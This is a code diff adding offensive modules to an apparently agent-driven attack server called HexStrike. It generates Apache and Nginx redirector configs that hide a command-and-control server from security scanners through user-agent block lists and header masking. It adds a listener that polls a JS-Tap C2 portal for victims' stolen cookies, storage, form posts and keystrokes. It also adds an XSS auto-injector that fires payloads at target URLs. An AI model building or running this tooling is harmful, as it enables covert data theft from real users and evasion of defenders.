@@ -17911,6 +17911,770 @@ def tunnel_status_route():
         return jsonify({"error": f"Server error: {e}"}), 500
 
 
+# ============================================================================
+# REDIRECTOR — generate Apache / Nginx config to front the C2
+# ============================================================================
+
+class RedirectorManager:
+    """Generates Apache mod_rewrite / Nginx proxy configs that forward
+    legitimate browser traffic to the C2 while blocking scanners and bots.
+
+    The redirector sits on a VPS with a clean domain. Victims hit the
+    redirector, which proxies to the tunnel or direct C2 URL. Security
+    scanners see a 403 and never touch the real C2.
+    """
+
+    # User-agents to block (scanners, crawlers, headless engines)
+    BOT_UA_PATTERNS = [
+        "curl", "wget", "python-requests", "python-urllib",
+        "nikto", "nmap", "masscan", "zgrab", "shodan", "censys",
+        "nessus", "openvas", "nuclei", "httpx", "gobuster", "ffuf",
+        "dirbuster", "sqlmap", "burpsuite", "go-http-client",
+        "java/", "libwww", "lwp-trivial", "msfcrawler",
+    ]
+
+    def generate_apache(
+        self,
+        c2_url: str,
+        domain: str,
+        filter_bots: bool = True,
+        allowed_paths: Optional[List[str]] = None,
+        ssl_cert: str = "/etc/ssl/certs/redirector.crt",
+        ssl_key: str = "/etc/ssl/private/redirector.key",
+    ) -> str:
+        """Generate Apache VirtualHost config with mod_rewrite + mod_proxy rules."""
+        c2_url = c2_url.rstrip("/")
+
+        bot_block = ""
+        if filter_bots:
+            ua_pattern = "|".join(self.BOT_UA_PATTERNS)
+            bot_block = f"""
+    # ── Block scanners / bots ────────────────────────────────────────────
+    RewriteCond %{{HTTP_USER_AGENT}} "({ua_pattern})" [NC]
+    RewriteRule .* - [F,L]
+
+    # Only allow real browser traffic
+    RewriteCond %{{HTTP_USER_AGENT}} !^(Mozilla|Opera) [NC]
+    RewriteRule .* - [F,L]
+"""
+
+        path_block = ""
+        if allowed_paths:
+            conditions = "\n    ".join(
+                f'RewriteCond %{{REQUEST_URI}} !^{p}' for p in allowed_paths
+            )
+            path_block = f"""
+    # ── Restrict to allowed URI paths ────────────────────────────────────
+    {conditions}
+    RewriteRule .* - [F,L]
+"""
+
+        config = f"""# HexStrike Redirector — Apache config for {domain}
+# Generated: {datetime.now().isoformat()}
+# C2 target: {c2_url}
+#
+# Requirements: mod_rewrite, mod_proxy, mod_proxy_http, mod_ssl
+# Install:  a2enmod rewrite proxy proxy_http ssl headers
+# Deploy:   /etc/apache2/sites-available/{domain}.conf
+# Enable:   a2ensite {domain} && systemctl reload apache2
+
+<VirtualHost *:80>
+    ServerName {domain}
+    RewriteEngine On
+    RewriteRule ^(.*)$ https://%{{HTTP_HOST}}$1 [R=301,L]
+</VirtualHost>
+
+<VirtualHost *:443>
+    ServerName {domain}
+
+    SSLEngine on
+    SSLCertificateFile    {ssl_cert}
+    SSLCertificateKeyFile {ssl_key}
+    SSLProtocol           all -SSLv3 -TLSv1 -TLSv1.1
+    SSLCipherSuite        HIGH:!aNULL:!MD5
+
+    RewriteEngine On
+    ProxyRequests Off
+    ProxyPreserveHost Off
+    SSLProxyEngine On
+    SSLProxyVerify none
+    SSLProxyCheckPeerCN off
+    SSLProxyCheckPeerName off
+{bot_block}{path_block}
+    # ── Forward all surviving traffic to C2 ──────────────────────────────
+    ProxyPass        / {c2_url}/
+    ProxyPassReverse / {c2_url}/
+
+    RequestHeader set  X-Forwarded-For  %{{REMOTE_ADDR}}s
+    RequestHeader unset X-Forwarded-Host
+
+    # Operational security — hide server identity
+    ServerSignature Off
+    Header unset Server
+    Header always set Server "Apache"
+</VirtualHost>
+"""
+        return config
+
+    def generate_nginx(
+        self,
+        c2_url: str,
+        domain: str,
+        filter_bots: bool = True,
+        allowed_paths: Optional[List[str]] = None,
+        ssl_cert: str = "/etc/ssl/certs/redirector.crt",
+        ssl_key: str = "/etc/ssl/private/redirector.key",
+    ) -> str:
+        """Generate Nginx server block with proxy and bot-filtering rules."""
+        c2_url = c2_url.rstrip("/")
+
+        bot_block = ""
+        if filter_bots:
+            ua_pattern = "|".join(self.BOT_UA_PATTERNS)
+            bot_block = f"""
+    # ── Block scanners / bots ────────────────────────────────────────────
+    if ($http_user_agent ~* "({ua_pattern})") {{
+        return 403;
+    }}
+
+    # Only allow real browser traffic (must look like Mozilla or Opera)
+    if ($http_user_agent !~* "(Mozilla|Opera)") {{
+        return 403;
+    }}
+"""
+
+        path_block = ""
+        if allowed_paths:
+            path_exprs = "|".join(re.escape(p) for p in allowed_paths)
+            path_block = f"""
+    # ── Restrict to allowed URI paths ────────────────────────────────────
+    location ~* "^(?!({path_exprs}))" {{
+        return 403;
+    }}
+"""
+
+        config = f"""# HexStrike Redirector — Nginx config for {domain}
+# Generated: {datetime.now().isoformat()}
+# C2 target: {c2_url}
+#
+# Deploy:   /etc/nginx/sites-available/{domain}
+# Enable:   ln -s /etc/nginx/sites-available/{domain} /etc/nginx/sites-enabled/
+#           nginx -t && systemctl reload nginx
+
+server {{
+    listen 80;
+    server_name {domain};
+    return 301 https://$host$request_uri;
+}}
+
+server {{
+    listen 443 ssl http2;
+    server_name {domain};
+
+    ssl_certificate     {ssl_cert};
+    ssl_certificate_key {ssl_key};
+    ssl_protocols       TLSv1.2 TLSv1.3;
+    ssl_ciphers         HIGH:!aNULL:!MD5;
+{bot_block}{path_block}
+    # ── Forward all surviving traffic to C2 ──────────────────────────────
+    location / {{
+        proxy_pass          {c2_url};
+        proxy_http_version  1.1;
+        proxy_set_header    Host              $host;
+        proxy_set_header    X-Real-IP         $remote_addr;
+        proxy_set_header    X-Forwarded-For   $proxy_add_x_forwarded_for;
+        proxy_set_header    X-Forwarded-Proto $scheme;
+        proxy_ssl_verify    off;
+
+        # Operational security
+        proxy_hide_header   Server;
+        add_header          Server "nginx" always;
+    }}
+}}
+"""
+        return config
+
+    def save(self, config: str, output_path: str) -> Dict[str, Any]:
+        """Write config to disk and return the absolute path."""
+        try:
+            abs_path = os.path.abspath(output_path)
+            os.makedirs(os.path.dirname(abs_path) or ".", exist_ok=True)
+            with open(abs_path, "w") as fh:
+                fh.write(config)
+            return {"success": True, "path": abs_path}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+
+redirector_manager = RedirectorManager()
+
+
+@app.route("/api/tools/redirector/generate", methods=["POST"])
+def redirector_generate():
+    """Generate an Apache or Nginx redirector config."""
+    try:
+        params = request.json or {}
+        c2_url = params.get("c2_url", "")
+        domain = params.get("domain", "example.com")
+        server_type = params.get("server_type", "nginx").lower()
+        filter_bots = params.get("filter_bots", True)
+        allowed_paths = params.get("allowed_paths", None)
+        ssl_cert = params.get("ssl_cert", "/etc/ssl/certs/redirector.crt")
+        ssl_key = params.get("ssl_key", "/etc/ssl/private/redirector.key")
+        output_dir = params.get("output_dir", "")
+
+        if not c2_url:
+            return jsonify({"error": "c2_url is required"}), 400
+
+        logger.info(f"🔀 Generating {server_type} redirector config → {c2_url}")
+
+        if server_type == "apache":
+            config = redirector_manager.generate_apache(
+                c2_url, domain, filter_bots, allowed_paths, ssl_cert, ssl_key
+            )
+            filename = f"{domain}_apache.conf"
+        else:
+            config = redirector_manager.generate_nginx(
+                c2_url, domain, filter_bots, allowed_paths, ssl_cert, ssl_key
+            )
+            filename = f"{domain}_nginx.conf"
+
+        result: Dict[str, Any] = {
+            "success": True,
+            "server_type": server_type,
+            "domain": domain,
+            "c2_url": c2_url,
+            "filter_bots": filter_bots,
+            "config": config,
+        }
+
+        if output_dir:
+            save_path = os.path.join(output_dir, filename)
+            save_result = redirector_manager.save(config, save_path)
+            result.update(save_result)
+        else:
+            result["filename"] = filename
+
+        return jsonify(result)
+
+    except Exception as e:
+        logger.error(f"💥 redirector/generate error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+# ============================================================================
+# BEACON LISTENER — poll JS-Tap's authenticated API for active clients/loot
+# ============================================================================
+
+class BeaconListener:
+    """Polls the JS-Tap C2 portal API to surface active client sessions and
+    collected loot (cookies, localStorage, form posts, XHR calls, etc.).
+
+    JS-Tap uses session-based auth (Flask-Login). We maintain an authenticated
+    requests.Session and poll /api/getClients on a background thread, resolving
+    each event to its detailed loot record.
+    """
+
+    # Map JS-Tap eventType strings to their API endpoints
+    EVENT_ENDPOINTS: Dict[str, str] = {
+        "SCREENSHOT":    "/api/clientScreenshot/{}",
+        "HTML":          "/api/clientHtml/{}",
+        "URLVISITED":    "/api/clientUrl/{}",
+        "USERINPUT":     "/api/clientUserInput/{}",
+        "COOKIE":        "/api/clientCookie/{}",
+        "LOCALSTORAGE":  "/api/clientLocalStorage/{}",
+        "SESSIONSTORAGE":"/api/clientSessionStorage/{}",
+        "XHRAPICALL":    "/api/clientXhrApiCall/{}",
+        "FETCHAPICALL":  "/api/clientFetchApiCall/{}",
+        "FORMPOST":      "/api/clientFormPosts/{}",
+        "CUSTOMEXFIL":   "/api/clientCustomExfilDetail/{}",
+    }
+
+    def __init__(self):
+        self._session: Optional[requests.Session] = None
+        self._base_url: str = ""
+        self._poll_thread: Optional[threading.Thread] = None
+        self._stop_event = threading.Event()
+        self._lock = threading.Lock()
+        self._clients: Dict[str, Any] = {}   # id → client dict
+        self._loot: Dict[str, List[Any]] = {} # client_id → list of resolved events
+        self._new_clients: List[str] = []     # ids seen since last beacon_list call
+        self._poll_interval: int = 10
+        self._started_at: Optional[datetime] = None
+        self._poll_count: int = 0
+        self._authenticated: bool = False
+
+    # ------------------------------------------------------------------
+    # Auth
+    # ------------------------------------------------------------------
+
+    def authenticate(self, base_url: str, username: str, password: str) -> Dict[str, Any]:
+        """Authenticate to JS-Tap and store the session cookie."""
+        self._base_url = base_url.rstrip("/")
+        self._session = requests.Session()
+        self._session.verify = False  # JS-Tap typically uses self-signed certs
+        try:
+            resp = self._session.post(
+                f"{self._base_url}/login",
+                data={"username": username, "password": password},
+                timeout=10,
+                allow_redirects=True,
+            )
+            # JS-Tap redirects to / on success, returns "No." on failure
+            if resp.status_code in (200, 302) and "No." not in resp.text:
+                self._authenticated = True
+                logger.info(f"🔓 Beacon listener authenticated to {self._base_url}")
+                return {"success": True, "base_url": self._base_url}
+            return {
+                "success": False,
+                "error": f"Auth failed (HTTP {resp.status_code}). Check credentials.",
+            }
+        except Exception as e:
+            return {"success": False, "error": f"Auth request failed: {e}"}
+
+    # ------------------------------------------------------------------
+    # Polling
+    # ------------------------------------------------------------------
+
+    def _resolve_event(self, event: Dict[str, Any]) -> Dict[str, Any]:
+        """Fetch the detailed loot record for a single event."""
+        event_type = event.get("eventType", "")
+        event_id = event.get("eventID", "")
+        endpoint_tpl = self.EVENT_ENDPOINTS.get(event_type)
+
+        resolved = {
+            "timestamp": event.get("timeStamp"),
+            "type": event_type,
+            "id": event_id,
+            "data": None,
+        }
+
+        if endpoint_tpl and event_id and self._session:
+            try:
+                url = f"{self._base_url}{endpoint_tpl.format(event_id)}"
+                resp = self._session.get(url, timeout=8)
+                if resp.status_code == 200:
+                    resolved["data"] = resp.json()
+            except Exception as e:
+                resolved["error"] = str(e)
+
+        return resolved
+
+    def _poll_once(self) -> None:
+        """Single poll cycle: fetch clients, resolve new events."""
+        if not self._session or not self._authenticated:
+            return
+        try:
+            resp = self._session.get(
+                f"{self._base_url}/api/getClients", timeout=10
+            )
+            if resp.status_code == 401:
+                logger.warning("⚠️  Beacon listener session expired")
+                self._authenticated = False
+                return
+            clients = resp.json()
+        except Exception as e:
+            logger.warning(f"Beacon poll failed: {e}")
+            return
+
+        with self._lock:
+            for client in clients:
+                cid = str(client.get("id", ""))
+                is_new = cid not in self._clients
+                self._clients[cid] = client
+                if is_new:
+                    self._new_clients.append(cid)
+                    self._loot[cid] = []
+                    logger.info(
+                        f"🎯 New JS-Tap client: {client.get('ip')} "
+                        f"[{client.get('browser')} / {client.get('platform')}]"
+                    )
+
+            # Resolve events for clients that have new jobs
+            for client in clients:
+                cid = str(client.get("id", ""))
+                if not client.get("hasJobs"):
+                    continue
+                try:
+                    ev_resp = self._session.get(
+                        f"{self._base_url}/api/clientEvents/{cid}", timeout=10
+                    )
+                    events = ev_resp.json() if ev_resp.status_code == 200 else []
+                except Exception:
+                    events = []
+
+                known_ids = {e.get("id") for e in self._loot.get(cid, [])}
+                for ev in events:
+                    if ev.get("id") not in known_ids:
+                        resolved = self._resolve_event(ev)
+                        self._loot.setdefault(cid, []).append(resolved)
+
+        self._poll_count += 1
+
+    def _poll_loop(self) -> None:
+        """Background thread: poll until stop_event is set."""
+        while not self._stop_event.is_set():
+            self._poll_once()
+            self._stop_event.wait(self._poll_interval)
+
+    # ------------------------------------------------------------------
+    # Public API
+    # ------------------------------------------------------------------
+
+    def start(
+        self,
+        base_url: str,
+        username: str,
+        password: str,
+        interval: int = 10,
+    ) -> Dict[str, Any]:
+        """Authenticate and start the background polling thread."""
+        if self._poll_thread and self._poll_thread.is_alive():
+            return {"success": False, "error": "Beacon listener already running"}
+
+        auth_result = self.authenticate(base_url, username, password)
+        if not auth_result.get("success"):
+            return auth_result
+
+        self._poll_interval = max(5, interval)
+        self._stop_event.clear()
+        self._poll_thread = threading.Thread(
+            target=self._poll_loop, daemon=True, name="beacon-listener"
+        )
+        self._poll_thread.start()
+        self._started_at = datetime.now()
+
+        # Run one immediate poll
+        self._poll_once()
+
+        return {
+            "success": True,
+            "base_url": base_url,
+            "poll_interval": self._poll_interval,
+            "started_at": self._started_at.isoformat(),
+        }
+
+    def stop(self) -> Dict[str, Any]:
+        """Stop the polling thread."""
+        if not self._poll_thread or not self._poll_thread.is_alive():
+            return {"success": False, "error": "Beacon listener is not running"}
+        self._stop_event.set()
+        self._poll_thread.join(timeout=5)
+        self._authenticated = False
+        return {
+            "success": True,
+            "message": "Beacon listener stopped",
+            "total_polls": self._poll_count,
+            "clients_seen": len(self._clients),
+        }
+
+    def get_clients(self, only_new: bool = False) -> Dict[str, Any]:
+        """Return cached client list."""
+        with self._lock:
+            if only_new:
+                result = {cid: self._clients[cid] for cid in self._new_clients if cid in self._clients}
+                self._new_clients.clear()
+            else:
+                result = dict(self._clients)
+        running = bool(self._poll_thread and self._poll_thread.is_alive())
+        uptime = (
+            str(datetime.now() - self._started_at).split(".")[0]
+            if self._started_at and running else None
+        )
+        return {
+            "running": running,
+            "client_count": len(result),
+            "clients": list(result.values()),
+            "total_polls": self._poll_count,
+            "uptime": uptime,
+        }
+
+    def get_loot(self, client_id: str) -> Dict[str, Any]:
+        """Return all resolved loot for a specific client."""
+        with self._lock:
+            client = self._clients.get(str(client_id))
+            loot = list(self._loot.get(str(client_id), []))
+        if not client:
+            return {"success": False, "error": f"Client {client_id} not found"}
+
+        # Bucket loot by type for easier agent consumption
+        bucketed: Dict[str, List[Any]] = {}
+        for item in loot:
+            t = item.get("type", "UNKNOWN")
+            bucketed.setdefault(t, []).append(item)
+
+        return {
+            "success": True,
+            "client": client,
+            "loot_count": len(loot),
+            "loot_by_type": bucketed,
+        }
+
+
+beacon_listener = BeaconListener()
+
+
+@app.route("/api/tools/beacon/start", methods=["POST"])
+def beacon_start():
+    """Authenticate to JS-Tap and start the background beacon polling loop."""
+    try:
+        params = request.json or {}
+        base_url = params.get("jstap_url", "")
+        username = params.get("username", "")
+        password = params.get("password", "")
+        interval = int(params.get("interval", 10))
+
+        if not all([base_url, username, password]):
+            return jsonify({"error": "jstap_url, username, and password are required"}), 400
+
+        logger.info(f"📡 Starting beacon listener → {base_url} (every {interval}s)")
+        result = beacon_listener.start(base_url, username, password, interval)
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 beacon/start error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+@app.route("/api/tools/beacon/stop", methods=["POST"])
+def beacon_stop():
+    """Stop the beacon polling loop."""
+    try:
+        result = beacon_listener.stop()
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 beacon/stop error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+@app.route("/api/tools/beacon/clients", methods=["GET"])
+def beacon_clients():
+    """Return cached JS-Tap client list."""
+    try:
+        only_new = request.args.get("only_new", "false").lower() == "true"
+        return jsonify(beacon_listener.get_clients(only_new=only_new))
+    except Exception as e:
+        logger.error(f"💥 beacon/clients error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+@app.route("/api/tools/beacon/loot/<client_id>", methods=["GET"])
+def beacon_loot(client_id: str):
+    """Return all resolved loot for a specific client."""
+    try:
+        return jsonify(beacon_listener.get_loot(client_id))
+    except Exception as e:
+        logger.error(f"💥 beacon/loot error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
+# ============================================================================
+# XSS AUTO-INJECTOR — deliver payload automatically at discovered write points
+# ============================================================================
+
+class XSSAutoInjector:
+    """Automatically delivers an XSS payload to a discovered injection point.
+
+    Supports three injection surfaces:
+      url_param  — injects into a GET query parameter
+      form_field — submits a form with the payload in a named field (GET or POST)
+      header     — sends the payload in a custom HTTP header
+
+    For each injection the injector makes the request and returns:
+      - HTTP response code and length (quick indicator of success/WAF block)
+      - The exact URL / curl equivalent for the operator to verify
+      - A hint if the payload appears reflected in the response body
+    """
+
+    def inject(
+        self,
+        target_url: str,
+        payload: str,
+        injection_point: str = "url_param",
+        param_name: str = "q",
+        method: str = "GET",
+        extra_params: Optional[Dict[str, str]] = None,
+        headers: Optional[Dict[str, str]] = None,
+        cookies: Optional[Dict[str, str]] = None,
+        verify_ssl: bool = False,
+        timeout: int = 15,
+    ) -> Dict[str, Any]:
+        """Deliver the XSS payload to the target injection point."""
+
+        session = requests.Session()
+        req_headers = {
+            "User-Agent": (
+                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
+                "AppleWebKit/537.36 (KHTML, like Gecko) "
+                "Chrome/122.0.0.0 Safari/537.36"
+            )
+        }
+        if headers:
+            req_headers.update(headers)
+
+        extra_params = extra_params or {}
+        method = method.upper()
+
+        try:
+            if injection_point == "url_param":
+                all_params = dict(extra_params)
+                all_params[param_name] = payload
+                resp = session.request(
+                    method,
+                    target_url,
+                    params=all_params,
+                    headers=req_headers,
+                    cookies=cookies,
+                    verify=verify_ssl,
+                    timeout=timeout,
+                    allow_redirects=True,
+                )
+                injected_url = resp.url
+                curl_cmd = (
+                    f'curl -sk -A "{req_headers["User-Agent"]}" '
+                    f'"{injected_url}"'
+                )
+
+            elif injection_point == "form_field":
+                form_data = dict(extra_params)
+                form_data[param_name] = payload
+                if method == "GET":
+                    resp = session.get(
+                        target_url,
+                        params=form_data,
+                        headers=req_headers,
+                        cookies=cookies,
+                        verify=verify_ssl,
+                        timeout=timeout,
+                        allow_redirects=True,
+                    )
+                    injected_url = resp.url
+                    curl_cmd = f'curl -sk -G "{target_url}" ' + " ".join(
+                        f'--data-urlencode "{k}={v}"' for k, v in form_data.items()
+                    )
+                else:
+                    resp = session.post(
+                        target_url,
+                        data=form_data,
+                        headers=req_headers,
+                        cookies=cookies,
+                        verify=verify_ssl,
+                        timeout=timeout,
+                        allow_redirects=True,
+                    )
+                    injected_url = target_url
+                    curl_cmd = (
+                        f'curl -sk -X POST "{target_url}" '
+                        + " ".join(f'-d "{k}={v}"' for k, v in form_data.items())
+                    )
+
+            elif injection_point == "header":
+                req_headers[param_name] = payload
+                resp = session.request(
+                    method,
+                    target_url,
+                    params=extra_params or None,
+                    headers=req_headers,
+                    cookies=cookies,
+                    verify=verify_ssl,
+                    timeout=timeout,
+                    allow_redirects=True,
+                )
+                injected_url = target_url
+                header_args = " ".join(
+                    f'-H "{k}: {v}"' for k, v in req_headers.items()
+                )
+                curl_cmd = f'curl -sk {header_args} "{target_url}"'
+
+            else:
+                return {
+                    "success": False,
+                    "error": (
+                        f"Unknown injection_point '{injection_point}'. "
+                        "Use url_param, form_field, or header."
+                    ),
+                }
+
+            body_snippet = resp.text[:500] if resp.text else ""
+            reflected = payload[:20] in resp.text if resp.text else False
+
+            return {
+                "success": True,
+                "injection_point": injection_point,
+                "param_name": param_name,
+                "target_url": target_url,
+                "injected_url": injected_url,
+                "method": method,
+                "status_code": resp.status_code,
+                "response_length": len(resp.content),
+                "payload_reflected": reflected,
+                "body_snippet": body_snippet,
+                "curl": curl_cmd,
+                "hint": (
+                    "✅ Payload reflected — likely vulnerable"
+                    if reflected
+                    else "⚠️  Payload not reflected in response (may be stored or filtered)"
+                ),
+            }
+
+        except requests.exceptions.Timeout:
+            return {
+                "success": False,
+                "error": f"Request timed out after {timeout}s",
+                "target_url": target_url,
+            }
+        except Exception as e:
+            return {"success": False, "error": str(e), "target_url": target_url}
+
+
+xss_auto_injector = XSSAutoInjector()
+
+
+@app.route("/api/tools/autoinject/xss", methods=["POST"])
+def autoinject_xss():
+    """Deliver an XSS payload to a discovered injection point."""
+    try:
+        params = request.json or {}
+        target_url = params.get("target_url", "")
+        payload = params.get("payload", "")
+        injection_point = params.get("injection_point", "url_param")
+        param_name = params.get("param_name", "q")
+        method = params.get("method", "GET")
+        extra_params = params.get("extra_params", {})
+        headers = params.get("headers", {})
+        cookies = params.get("cookies", {})
+        verify_ssl = params.get("verify_ssl", False)
+        timeout = int(params.get("timeout", 15))
+
+        if not target_url or not payload:
+            return jsonify({"error": "target_url and payload are required"}), 400
+
+        logger.info(
+            f"💉 Auto-inject [{injection_point}:{param_name}] → {target_url}"
+        )
+        result = xss_auto_injector.inject(
+            target_url=target_url,
+            payload=payload,
+            injection_point=injection_point,
+            param_name=param_name,
+            method=method,
+            extra_params=extra_params,
+            headers=headers,
+            cookies=cookies,
+            verify_ssl=verify_ssl,
+            timeout=timeout,
+        )
+
+        if result.get("payload_reflected"):
+            logger.info(f"✅ Payload reflected at {target_url}")
+        else:
+            logger.info(f"📤 Injection sent to {target_url} (HTTP {result.get('status_code')})")
+
+        return jsonify(result)
+    except Exception as e:
+        logger.error(f"💥 autoinject/xss error: {e}")
+        return jsonify({"error": f"Server error: {e}"}), 500
+
+
 # Create the banner after all classes are defined
 BANNER = ModernVisualEngine.create_banner()
 
